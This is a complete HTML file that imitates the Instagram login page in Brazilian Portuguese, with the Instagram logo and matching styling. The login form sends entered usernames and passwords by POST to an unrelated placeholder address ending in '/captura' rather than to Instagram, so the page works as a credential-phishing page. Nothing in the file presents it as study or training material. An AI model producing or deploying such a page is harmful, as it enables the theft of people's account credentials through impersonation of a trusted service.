<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            border-radius: 1rem;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 300px;
            text-align: center;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .submit-btn:hover {
            background-color: #007bb5;
        }
        .divider {
            margin: 20px 0;
            border-bottom: 1px solid #dbdbdb;
        }
        .forgot-password {
            font-size: 14px;
            color: #00376b;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/512px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
    
    <form action="https://www.exemplo.com/captura" method="POST">
        <input type="text" name="username" class="input-field" placeholder="Número de telefone, nome de usuário ou e-mail" required>
        <input type="password" name="password" class="input-field" placeholder="Senha" required>
        <button type="submit" class="submit-btn">Entrar</button>
    </form>

    <div class="divider"></div>

    <a href="#" class="forgot-password">Esqueceu a senha?</a>
</div>

</body>
</html>
